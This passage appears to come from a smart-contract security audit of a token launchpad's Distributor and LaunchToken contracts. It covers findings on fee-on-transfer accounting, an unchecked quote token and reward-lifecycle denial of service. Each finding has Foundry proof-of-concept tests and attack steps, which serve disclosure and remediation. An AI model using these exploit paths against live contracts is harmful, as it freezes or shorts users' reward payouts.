    LaunchpadHarness lp;
    MockRouter router;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new MockRouter();
        lp = new LaunchpadHarness(address(router));
        vm.deal(attacker, 1 ether);
    }

    function testRefundSucceedsWithNonFOT() public {
        ERC20Like nonFOT = new ERC20Like("NONFOT","NF",18,false,0);
        nonFOT.mint(attacker, 1_000e18);
        vm.startPrank(attacker);
        nonFOT.approve(address(lp), type(uint256).max);
        (uint256 outBase, uint256 outQuote) = lp.callSwapRemaining(address(nonFOT), address(0xCAFE), attacker, 1e18, 100e18);
        // Router reverts, catch path executes a full refund; function returns (0,0)
        assertEq(outBase, 0);
        assertEq(outQuote, 0);
        vm.stopPrank();
    }

    function testRefundRevertsWithFOT_DoS() public {
        ERC20Like fot = new ERC20Like("FOT","FOT",18,true,1000); // 10% fee
        fot.mint(attacker, 1_000e18);
        vm.startPrank(attacker);
        fot.approve(address(lp), type(uint256).max);
        // Because only 90% is received by lp, the refund of 100e18 will revert
        vm.expectRevert();
        lp.callSwapRemaining(address(fot), address(0xCAFE), attacker, 1e18, 100e18);
        vm.stopPrank();
    }
}


## Suggested Mitigation
- Use balance-delta accounting in _swapRemaining:
  1) uint256 before = IERC20(data.quote).balanceOf(address(this));
  2) transferFrom(msg.sender, address(this), data.quoteAmount);
  3) uint256 received = IERC20(data.quote).balanceOf(address(this)) - before;
  4) Approve and pass received as amountInMax; if swap fails, refund received (not data.quoteAmount).
- Alternatively, route the swap via a supporting-fee-on-transfer path and/or require the quote asset to be non-FOT at config time.
- Always approve the exact amount to be used and zero-approve on failure.





 **Derived From** : addRewards over-credits pending on fee-on-transfer tokens

## [M-24]. Distributor.addRewards credits rewards before pulling tokens; fee-on-transfer/rebasing tokens brick claims (DoS)

## Derived From Pattern/Invariant
addRewards over-credits pending on fee-on-transfer tokens

## Exploit Type
FeeOnTransferAssumption

## Location
Distributor.addRewards

## Minimim Privilege Required
Permissionless

## Description
Distributor.addRewards updates rs.pending* and totalPendingRewards with the requested amount before actually pulling tokens, and never verifies the post-transfer delta. For fee-on-transfer/rebasing tokens, the contract receives less than amount, leaving totalPendingRewards[asset] > actual balance. Later distributions call _decreaseTotalPending first (succeeds), then safeTransfer reverts due to insufficient balance, bricking claimRewards/increaseStake/decreaseStake for that asset until someone tops up the shortfall. Vulnerable snippet:

if (launchAssetAmount > 0) {
    rs.addBaseRewards(launchAsset, launchAssetAmount);
    _increaseTotalPending(launchAsset, launchAssetAmount);
    launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount)); // no balance delta check
}
if (quoteAssetAmount > 0) {
    rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
    _increaseTotalPending(quoteAsset, quoteAssetAmount);
    quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount)); // no balance delta check
}

## Impact
Functional DoS of rewards: totalPendingRewards is over-credited vs actual balance; subsequent claims and stake/unstake distributions revert on safeTransfer, blocking payouts until external top-up.

## Proof of Concept
- Precondition: A rewards pair exists and has non-zero totalShares, and one of its assets is fee-on-transfer or rebasing.
- Attacker acquires that asset and approves Distributor.
- Attacker calls addRewards with amount X. The token taxes say 50%, so only X/2 arrives; rs.pending* and totalPendingRewards are credited with X.
- A staker calls claimRewards. _decreaseTotalPending succeeds (uses credited X), then safeTransfer tries to send X but Distributor balance is only X/2, so it reverts. All claims for that asset are now bricked until someone tops up the shortfall.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/* ------------------------------  Helpers  ------------------------------ */
contract FeeOnTransferToken {
    string public name; string public symbol; uint8 public decimals = 18;
    uint256 public totalSupply; mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(string memory n,string memory s){name=n;symbol=s;}
    function mint(address to,uint256 amt) external {balanceOf[to]+=amt;totalSupply+=amt;}
    function approve(address sp,uint256 amt) external returns(bool){allowance[msg.sender][sp]=amt;return true;}
    function transfer(address to,uint256 amt) external returns(bool){_transfer(msg.sender,to,amt);return true;}
    function transferFrom(address f,address t,uint256 amt) external returns(bool){require(allowance[f][msg.sender]>=amt,"allow");allowance[f][msg.sender]-=amt;_transfer(f,t,amt);return true;}
    // 50 % burn fee
    function _transfer(address f,address t,uint256 amt) internal {require(balanceOf[f]>=amt,"bal");uint256 fee=amt/2;uint256 recv=amt-fee;balanceOf[f]-=amt;balanceOf[t]+=recv;totalSupply-=fee;}
}

/* -----------------------------  Subject  ------------------------------- */
contract BuggyDistributor {
    using stdStorage for StdStorage;
    using stdCheats for Vm;
    /* identical bug: credits before pull */
    mapping(address=>uint256) public totalPending;
    function addRewards(address token,uint256 amount) external {
        totalPending[token]+=amount;               // over-credit
        FeeOnTransferToken(token).transferFrom(msg.sender,address(this),amount);
    }
    function claim(address token,uint256 amount) external {
        require(totalPending[token]>=amount,"pending");
        totalPending[token]-=amount;
        // will revert if balance insufficient
        FeeOnTransferToken(token).transfer(msg.sender,amount);
    }
}

/* -------------------------------  Test  -------------------------------- */
contract DistributorFOT_DoS is Test {
    FeeOnTransferToken fot;
    BuggyDistributor dist;
    address attacker = address(0xA);
    address victim   = address(0xB);

    function setUp() public {
        fot  = new FeeOnTransferToken("FOT","FOT");
        dist = new BuggyDistributor();

        fot.mint(attacker,100 ether);
        fot.mint(victim,1 ether); // any amount

        vm.startPrank(attacker);
        fot.approve(address(dist),type(uint256).max);
        // attacker adds 100 FOT as rewards – only 50 arrive
        dist.addRewards(address(fot),100 ether);
        vm.stopPrank();
    }

    function test_DoS() public {
        // sanity: pending > real balance
        uint256 bal = fot.balanceOf(address(dist));
        uint256 pending = dist.totalPending(address(fot));
        assertGt(pending, bal);

        // victim tries to claim what contract thinks is available -> revert
        vm.startPrank(victim);
        vm.expectRevert();
        dist.claim(address(fot), pending);
        vm.stopPrank();
    }
}

## Suggested Mitigation
In addRewards, compute actual received via balance delta and credit that, not the requested amount. Example:

- For each non-zero amount: before = asset.balanceOf(address(this)); asset.safeTransferFrom(msg.sender, address(this), amount); received = asset.balanceOf(address(this)) - before;
- Use received (uint128) in rs.addBaseRewards/rs.addQuoteRewards and _increaseTotalPending;
- Optionally revert if received == 0 or received < minExpected to avoid silent mis-credit.

Apply same pattern to both launchAsset and quoteAsset branches.





 **Derived From** : addRewards accepts arbitrary quote token, desyncing pool vs payout token

## [M-25]. Distributor.addRewards accepts arbitrary quote token, corrupts totalPending mapping and DoS’s reward claims

## Derived From Pattern/Invariant
addRewards accepts arbitrary quote token, desyncing pool vs payout token

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.addRewards

## Minimim Privilege Required
Permissionless

## Description
addRewards treats token1 as quote asset whenever token0 already has a pool, without verifying token1 == rs.quoteAsset. It then: (1) credits the pool’s pendingQuoteRewards, (2) increases totalPendingRewards keyed by attacker-chosen token1, and (3) pulls token1 via transferFrom. Later, claim/increaseStake/decreaseStake pay quote using rs.quoteAsset and call _decreaseTotalPending(rs.quoteAsset,...). Because totalPendingRewards was incremented under the wrong token, claims revert with ClaimAmountExceedsTotalPendingRewards or drain any pre-existing correct-asset buffer. Vulnerable snippet:

function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);
    if (rs.quoteAsset == address(0)) { rs = RewardsTrackerStorage.getRewardPool(token1); if (rs.quoteAsset == address(0)) revert RewardsDoNotExist(); (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0); }
    // MISSING: require(quoteAsset == rs.quoteAsset)
    if (quoteAssetAmount > 0) {
        rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
        _increaseTotalPending(quoteAsset, quoteAssetAmount);
        quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));
    }
}
// Claims pay using rs.quoteAsset:
_distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);

## Impact
Any pool participant’s claimRewards reverts (ClaimAmountExceedsTotalPendingRewards) until the admin injects correct quote tokens. Wrong-token balances become stuck and unskimmable (balance == totalPending for wrong token), breaking accounting and blocking distributions; potential drain of any existing correct-asset buffer if present.

## Proof of Concept
- Setup a pool (launchAsset, correctQuote) and stake so rs.totalShares > 0.
- Attacker calls addRewards(launchAsset, wrongToken, 0, X) after approving wrongToken.
- Pool’s pendingQuoteRewards increases by X, but totalPendingRewards is increased under wrongToken, not correctQuote.
- A user calls claimRewards(launchAsset): claim computes a positive quoteAmount, then _distributeAssets tries to _decreaseTotalPending(correctQuote, quoteAmount) and reverts because totalPendingRewards[correctQuote] == 0.
- Accounting invariant breaks: total pending owed in quote is recorded under the wrong asset; claims are DoS’d and wrong-token funds are stuck (cannot be skimmed).

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(string memory n) { name = n; symbol = n; }
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function approve(address sp, uint256 amt) external returns (bool) { allowance[msg.sender][sp] = amt; return true; }
    function transfer(address to, uint256 amt) external returns (bool) { require(balanceOf[msg.sender] >= amt, "bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender]; require(a >= amt, "allow"); allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal"); balanceOf[from]-=amt; balanceOf[to]+=amt; return true;
    }
}

contract DistributorAddRewardsMismatchTest is Test {
    Distributor distributor;
    MockERC20 LA; // launch asset
    MockERC20 Q;  // correct quote asset
    MockERC20 W;  // wrong token injected by attacker

    address launchpad = address(0x1234);
    address user = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        LA = new MockERC20("LA");
        Q  = new MockERC20("Q");
        W  = new MockERC20("W");

        distributor = new Distributor();
        distributor.initialize(launchpad);

        vm.prank(launchpad);
        distributor.createRewardsPair(address(LA), address(Q));

        // Ensure totalShares > 0 so addRewards is allowed
        vm.prank(launchpad);
        distributor.increaseStake(address(LA), user, uint96(1));
    }

    function test_AddRewards_MismatchedQuote_DoS_Claim() public {
        // Attacker funds wrong token and adds it as quote rewards
        W.mint(attacker, 1e18);
        vm.prank(attacker); W.approve(address(distributor), type(uint256).max);
        vm.prank(attacker); distributor.addRewards(address(LA), address(W), 0, uint128(1e18));

        // Accounting shows pending recorded under wrong token; correct quote has none
        assertEq(distributor.totalPendingRewards(address(W)), 1e18);
        assertEq(distributor.totalPendingRewards(address(Q)), 0);

        // User claim tries to pay in rs.quoteAsset (Q) but mapping for Q is 0 => revert
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        vm.prank(user); distributor.claimRewards(address(LA));
    }
}


## Suggested Mitigation
- Enforce the pool’s configured quote asset: after resolving rs for the pair, set quoteAssetFixed = rs.quoteAsset and require(quoteAssetFixed != address(0)). If token0 has a pool, require(token1 == quoteAssetFixed). If token1 has a pool, require(token0 == quoteAssetFixed).
- Use rs.quoteAsset for accounting and transfers: call _increaseTotalPending(rs.quoteAsset, quoteAssetAmount) and rs.quoteAsset.safeTransferFrom(...), and pass rs.quoteAsset to addQuoteRewards for consistent events.
- Optionally harden by ignoring user-supplied quoteAsset entirely once rs is known: compute orientation and always deposit the pool’s quote token.





 **Derived From** : Router/Pair wrongly accrue bonding shares and rewards during lock

## [M-26]. Infrastructure addresses (router/pair) get staking credit during bonding, inflating totalFeeShare and diluting user rewards

## Derived From Pattern/Invariant
Router/Pair wrongly accrue bonding shares and rewards during lock

## Exploit Type
AccountingInvariantViolation

## Location
LaunchToken._beforeTokenTransfer

## Minimim Privilege Required
RequiresRole

## Description
While transfers are locked, any transfer from launchpad to a non-launchpad address credits bonding shares and calls Launchpad.increaseStake(to). There is no exclusion for infrastructure addresses (gteRouter, Uniswap pair), so seeding/infra transfers during bonding incorrectly give these contracts staking shares. Because the router (and pair) cannot forward tokens while locked, their bondingShare cannot be decreased and persists, inflating totalFeeShare and diluting user rewards. Vulnerable logic:

function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
    if (!unlocked) {
        if (from == launchpad && to != launchpad) _increaseFeeShares(to, amount); // credits router/pair too
        else if (to != launchpad && to != gteRouter) revert TransfersDisabledWhileBonding();
    }
    if (from != launchpad) _decreaseFeeShares(from, amount);
}

function _increaseFeeShares(address account, uint256 amount) internal {
    totalFeeShare += amount;
    bondingShare[account] += amount;                // router/pair accrue shares
    ILaunchpad(launchpad).increaseStake(account, uint96(amount));
}

## Impact
While transfers are locked, any launchpad->gteRouter transfer credits the router with bondingShare and increases totalFeeShare. Because the router cannot send tokens out until unlock, its share is never reduced, so rewards that should be distributed only to real users are continuously diluted for the entire bonding period. All stakers receive a smaller pro-rata payout, and the launchpad’s accounting (stake held in Launchpad contract) is wrong until an admin repair is executed after unlock.

## Proof of Concept
1. Launchpad is the only address allowed to transfer during bonding; gteRouter is the only non-launchpad recipient that bypasses the transfer lock.
2. Launchpad sends seed tokens to gteRouter while `unlocked == false`.
   from == launchpad  ➜  _increaseFeeShares(gteRouter, amount) is executed.
   bondingShare[gteRouter] and totalFeeShare grow by `amount`, and Launchpad.increaseStake(gteRouter) is called.
3. While locked, any attempt by gteRouter to forward tokens reverts because `to != gteRouter` and `from != launchpad`, so `_decreaseFeeShares` is never reached.
4. Users who buy from the bonding curve later are still credited correctly, but totalFeeShare already contains the router’s phantom share, so every user’s reward = userShare / (totalFeeShare_with_router) < intended.
5. The distortion persists until unlock, after which an admin must actively move or burn the router’s tokens to restore correct accounting.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {LaunchToken} from "contracts/launchpad/LaunchToken.sol";

contract LaunchpadMock {
    mapping(address => uint256) public stake;
    function increaseStake(address acct, uint96 amt) external { stake[acct] += uint256(amt); }
    function decreaseStake(address acct, uint96 amt) external {
        uint256 s = stake[acct];
        uint256 a = uint256(amt);
        stake[acct] = a > s ? 0 : s - a;
    }
    function endRewards() external {}
}

contract LaunchToken_AccountingInvariantViolationTest is Test {
    LaunchpadMock lp;
    LaunchToken token;
    address router = address(0xBEEF);
    address pair   = address(0xCAFE);
    address alice  = address(0xA11CE);

    function setUp() public {
        lp = new LaunchpadMock();
        vm.prank(address(lp));
        token = new LaunchToken("GTE", "GTE", "uri", router);
        vm.prank(address(lp));
        token.mint(1_000 ether);
    }

    function test_RouterAndPairAccrueUndeservedStakesDuringLock() public {
        uint256 seed = 200 ether;
        // Launchpad sends tokens to router during bonding -> credits router with bonding share
        vm.prank(address(lp));
        token.transfer(router, seed);

        assertEq(token.totalFeeShare(), seed, "totalFeeShare includes router");
        assertEq(token.bondingShare(router), seed, "router credited bonding share");
        assertEq(lp.stake(router), seed, "router staked in launchpad");

        // Router cannot forward tokens while locked -> shares cannot be decreased
        vm.prank(router);
        vm.expectRevert(LaunchToken.TransfersDisabledWhileBonding.selector);
        token.transfer(alice, 1);

        // Normal user transfer from launchpad also credits user, but denominator remains inflated by router
        uint256 buyAmt = 100 ether;
        vm.prank(address(lp));
        token.transfer(alice, buyAmt);
        assertEq(token.bondingShare(alice), buyAmt, "alice stake");
        assertEq(token.totalFeeShare(), seed + buyAmt, "denominator inflated by router share");

        // Invariant broken: infra address owns non-zero bondingShare during bonding
        assertGt(token.bondingShare(router), 0, "infra share must be zero");
    }
}

## Suggested Mitigation
- When from == launchpad, do not credit bonding shares for infrastructure addresses:
  if (from == launchpad && to != launchpad && to != gteRouter && to != uniPair) _increaseFeeShares(to, amount);
- Alternatively, maintain an exclude-list (router, known pair(s), vaults) and bypass _increaseFeeShares/increaseStake for them.
- Or disallow infra transfers during bonding and perform LP seeding only after unlock, or mint seed directly to pair post-unlock.
- As a guardrail, add a dedicated function on Launchpad to seed LP that does not call _increaseFeeShares.





 **Derived From** : unlocked => totalFeeShare_post <= totalFeeShare_pre and bondingShare[to]_post == bondingShare[to]_pre

## [M-27]. Rewards closure DoS: endRewards is permanently unreachable after unlock even when totalFeeShare drains to zero

## Derived From Pattern/Invariant
unlocked => totalFeeShare_post <= totalFeeShare_pre and bondingShare[to]_post == bondingShare[to]_pre

## Exploit Type
AccountingInvariantViolation

## Location
LaunchToken._beforeTokenTransfer

## Minimim Privilege Required
Permissionless

## Description
LaunchToken only calls _endRewards() inside _decreaseFeeShares() when (totalFeeShare == 0 && !unlocked). After unlock, _increaseFeeShares() is unreachable and only _decreaseFeeShares() runs for from!=launchpad. This guarantees bondingShare can only decrease post-unlock, but crucially also guarantees _endRewards() can never be invoked post-unlock even when totalFeeShare becomes 0. A permissionless user can ensure unlock happens while totalFeeShare > 0 (by holding any share prior to unlock); later, even if everyone fully transfers and totalFeeShare reaches 0, endRewards() and FeeShareConcluded are never emitted/called. This breaks the rewards state machine liveness, potentially leaving rewards pools active or unfinalized indefinitely, requiring admin intervention/upgrades off-protocol. Vulnerable snippets: (1) _beforeTokenTransfer: if (!unlocked) { ... if (from == launchpad && to != launchpad) _increaseFeeShares(to, amount); } ... if (from != launchpad) _decreaseFeeShares(from, amount); (2) _decreaseFeeShares: if (totalFeeShare == 0 && !unlocked) _endRewards();

## Impact
Functional DoS of rewards lifecycle: rewards finalization can never occur after unlock even when all bonding shares are gone. This can strand reward states/funds or distort downstream accounting until an admin-level repair outside normal flows.

## Proof of Concept
1) Launchpad deploys token and mints supply to itself. 2) Pre-unlock, Launchpad transfers some amount to User, which increases User’s bondingShare and totalFeeShare. 3) Launchpad calls unlock() while totalFeeShare > 0. 4) User transfers out exactly their bondingShare after unlock, making totalFeeShare reach 0. 5) Observe that endRewards() was never called and cannot be called anymore by LaunchToken, leaving rewards unfinalized.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {LaunchToken} from "contracts/launchpad/LaunchToken.sol";

contract LaunchpadMock {
    LaunchToken public token;
    bool public endRewardsCalled;
    mapping(address => uint96) public stake;

    function deployToken(address gteRouter) external returns (LaunchToken) {
        token = new LaunchToken("GTE", "GTE", "uri", gteRouter);
        return token;
    }

    // Launchpad entrypoints (onlyLaunchpad on token)
    function mint(uint256 amt) external { token.mint(amt); }
    function unlock() external { token.unlock(); }
    function transferTo(address to, uint256 amt) external { token.transfer(to, amt); }

    // ILaunchpad hooks called by LaunchToken
    function increaseStake(address account, uint96 amount) external {
        require(msg.sender == address(token), "only token");
        stake[account] += amount;
    }
    function decreaseStake(address account, uint96 amount) external {
        require(msg.sender == address(token), "only token");
        uint96 s = stake[account];
        stake[account] = amount > s ? 0 : s - amount;
    }
    function endRewards() external { 
        require(msg.sender == address(token), "only token");
        endRewardsCalled = true; 
    }
}

contract EndRewardsDoSPoC is Test {
    LaunchpadMock lp;
    LaunchToken token;
    address user = address(0xBEEF);
    address recip = address(0xCAFE);

    function setUp() public {
        lp = new LaunchpadMock();
        token = lp.deployToken(address(0xDEAD));
        // Mint to launchpad and distribute to user pre-unlock (creates bonding shares)
        lp.mint(1e18);
        lp.transferTo(user, 1e18);
        assertEq(token.totalFeeShare(), 1e18, "pre: totalFeeShare");
        assertEq(token.bondingShare(user), 1e18, "pre: user share");
    }

    function test_endRewardsUnreachableAfterUnlock() public {
        // Unlock while totalFeeShare > 0
        lp.unlock();
        assertTrue(token.unlocked(), "unlocked");

        // After unlock, transfer out full share to drain totalFeeShare to 0
        vm.prank(user);
        token.transfer(recip, 1e18);

        // Shares drained
        assertEq(token.bondingShare(user), 0, "user share drained");
        assertEq(token.totalFeeShare(), 0, "totalFeeShare drained");

        // Critically, endRewards was never called and is now unreachable via LaunchToken
        assertEq(lp.endRewardsCalled(), false, "endRewards should not be called post-unlock");
    }
}


## Suggested Mitigation
Provide a post-unlock path to finalize rewards. Options: (a) call _endRewards() whenever totalFeeShare == 0 regardless of unlocked state; (b) add a finalizeRewards() function callable by launchpad or anyone once unlocked && totalFeeShare == 0; (c) invoke _endRewards() inside unlock() if totalFeeShare == 0. Ensure idempotency in Launchpad/Distributor to prevent double-finalization.





 **Derived From** : Payouts assume exact transfer; users shorted on taxed tokens

## [H-28]. Distributor._distributeAssets silently short-pays claimants when reward token is fee-on-transfer; accounting decremented by full amount

## Derived From Pattern/Invariant
Payouts assume exact transfer; users shorted on taxed tokens

## Exploit Type
FeeOnTransferAssumption

## Location
Distributor._distributeAssets

## Minimim Privilege Required
Permissionless

## Description
Distributor._distributeAssets decreases totalPendingRewards by the computed baseAmount/quoteAmount and transfers that nominal amount to msg.sender using SafeTransferLib without verifying the actual post-transfer delta. For fee-on-transfer/rebase tokens, the recipient receives less than baseAmount/quoteAmount while totalPendingRewards is reduced by the full amount, permanently shorting users and misreporting pending reserves. Vulnerable snippet:

if (baseAmount > 0) {
    _decreaseTotalPending(base, baseAmount);
    base.safeTransfer(msg.sender, baseAmount); // recipient may receive < baseAmount
}
if (quoteAmount > 0) {
    _decreaseTotalPending(quote, quoteAmount);
    quote.safeTransfer(msg.sender, quoteAmount); // recipient may receive < quoteAmount
}

## Impact
Any time a fee-on-transfer or rebase token is used as a reward asset, every claimant is PERMANENTLY short-paid by the fee amount while the contract’s accounting pretends the full amount was paid. The missing tokens are either burnt or siphoned to the token’s fee sink. This leads to irreversible monetary loss for honest users and an unbounded depletion of the reward pool, satisfying the rubric for a High-severity reward-distortion/monetary-loss bug.

## Proof of Concept
1. Attacker (or careless admin) deploys a 10 % fee-on-transfer token TaxToken.
2. They call Distributor.createRewardsPair(TaxToken, USDC) and then addRewards(TaxToken, 0, 1 000 e18, 0) to fund the pool with 1 000 taxed tokens.  totalPendingRewards[TaxToken] is now 1 000.
3. Honest user has accrued 1 000 rewards and calls Distributor.claimRewards(TaxToken).
4. _distributeAssets() is executed:  • totalPendingRewards[TaxToken] is reduced by 1 000.  • TaxToken.safeTransfer(user, 1 000) only delivers 900 because 100 are routed to the TaxToken fee sink.
5. Result:
   – User receives 900 instead of 1 000 (10 % direct monetary loss).
   – Contract book-keeping believes nothing is owed (pending == 0) even though 100 were never delivered.
   – The 100 missing tokens are forever lost to claimants.
6. Each subsequent claimant suffers the same loss until the pool is exhausted, while nothing prevents adding more taxed rewards.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract FeeOnTransferToken {
    string public name = "TaxToken";
    string public symbol = "TAX";
    uint8 public decimals = 18;
    uint256 public constant FEE_BPS = 1000; // 10%
    address public feeSink;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address _feeSink) { feeSink = _feeSink; }

    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }

    function approve(address sp, uint256 amt) external returns (bool) { allowance[msg.sender][sp] = amt; return true; }

    function transfer(address to, uint256 amt) external returns (bool) { _move(msg.sender, to, amt); return true; }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        unchecked { allowance[from][msg.sender] = a - amt; }
        _move(from, to, amt);
        return true;
    }

    function _move(address from, address to, uint256 amt) internal {
        require(balanceOf[from] >= amt, "bal");
        unchecked { balanceOf[from] -= amt; }
        uint256 fee = (amt * FEE_BPS) / 10000;
        uint256 net = amt - fee;
        unchecked { balanceOf[to] += net; balanceOf[feeSink] += fee; }
    }
}

contract DistributorHarness is Distributor {
    function distributeAssetsHarness(address base, uint256 baseAmount, address quote, uint256 quoteAmount) external {
        _distributeAssets(base, baseAmount, quote, quoteAmount);
    }
    function increasePendingHarness(address asset, uint256 amount) external { _increaseTotalPending(asset, amount); }
}

contract FOT_DistributeAssets_Test is Test {
    DistributorHarness dist;
    FeeOnTransferToken tax;
    address attacker = address(0xA11CE);
    address feeSink = address(0xFEE);

    function setUp() public {
        dist = new DistributorHarness();
        dist.initialize(address(this)); // set launchpad owner for completeness
        tax = new FeeOnTransferToken(feeSink);
        // Fund distributor and set pending = 100e18
        tax.mint(address(dist), 100e18);
        dist.increasePendingHarness(address(tax), 100e18);
        assertEq(tax.balanceOf(address(dist)), 100e18);
        assertEq(dist.totalPendingRewards(address(tax)), 100e18);
    }

    function test_FeeOnTransfer_ShortPayoutAndAccounting() public {
        // Attacker triggers distribution of 100 tokens
        vm.prank(attacker);
        dist.distributeAssetsHarness(address(tax), 100e18, address(0), 0);

        // User only receives 90 (10% fee), but pending was decremented by full 100
        assertEq(tax.balanceOf(attacker), 90e18, "user received less than reported");
        assertEq(dist.totalPendingRewards(address(tax)), 0, "pending reduced by full amount");
        assertEq(tax.balanceOf(address(dist)), 0, "contract lost full 100, fee siphoned");
        assertEq(tax.balanceOf(feeSink), 10e18, "fee captured externally");
    }
}


## Suggested Mitigation
After each transfer (or transferFrom) compute the real amount moved:
uint256 pre = token.balanceOf(address(this));
_token.safeTransfer(to, amount);
uint256 delta = pre - token.balanceOf(address(this));
Require delta == amount (strict) OR, if flexibility is desired, only decrement totalPendingRewards by delta and credit the shortfall to a "unpaidRewards" buffer that can be refilled by the admin. In addition, consider whitelisting non-taxed ERC-20s for reward distribution to avoid this entire class of issues.



